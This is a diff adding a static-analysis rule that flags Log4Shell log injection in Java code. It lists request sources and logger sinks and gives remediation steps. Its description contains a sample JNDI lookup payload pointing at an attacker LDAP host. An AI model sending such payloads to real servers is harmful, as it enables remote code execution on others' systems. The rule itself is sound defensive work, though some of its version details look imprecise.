@@ -1,0 +1,51 @@
+rule_id: java_log_injection
+language: java
+vuln_class: Log Injection
+severity: Critical
+cwe: CWE-117
+owasp: A09:2021-Security Logging and Monitoring Failures
+cvss_score: 10.0
+cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+confidence: Confirmed
+issue: Log Injection (Log4Shell) via unsanitized user input passed to Log4j2 logger
+message: |-
+  User input is directly logged using Log4j2 without sanitization. In vulnerable versions of Log4j2 (2.0-beta9 through 2.16.0), the logger processes JNDI lookup strings embedded in log messages (e.g., ${jndi:ldap://attacker.com/x}). An attacker who controls any logged value can trigger a remote JNDI lookup, causing the server to load and execute arbitrary code from an attacker-controlled LDAP server. This is CVE-2021-44228, rated CVSS 10.0.
+sources:
+- request.getParameter(
+- request.getParameterValues(
+- request.getHeader(
+- request.getHeaders(
+- request.getCookies(
+- request.getInputStream(
+- request.getReader(
+- request.getQueryString(
+- request.getPathInfo(
+- '@RequestParam'
+- '@PathVariable'
+- '@RequestBody'
+- '@RequestHeader'
+- '@CookieValue'
+sinks:
+- logger.info(
+- logger.error(
+- logger.debug(
+- logger.warn(
+- logger.fatal(
+- log.info(
+- log.error(
+- log.debug(
+- log.warn(
+- LOG.info(
+- LOG.error(
+sanitizers: []
+remediation: |-
+  Upgrade Log4j2 to version 2.17.1 or later (for Java 8+). This completely removes JNDI lookup support from message formatting.
+
+  If you cannot upgrade immediately, set the JVM property:
+    -Dlog4j2.formatMsgNoLookups=true
+  or set the environment variable:
+    LOG4J_FORMAT_MSG_NO_LOOKUPS=true
+
+  Additionally, never log user-controlled input without sanitization:
+  UNSAFE: logger.info("User login: " + request.getHeader("X-User"));
+  SAFE:   logger.info("User login: {}", sanitize(request.getHeader("X-User")));
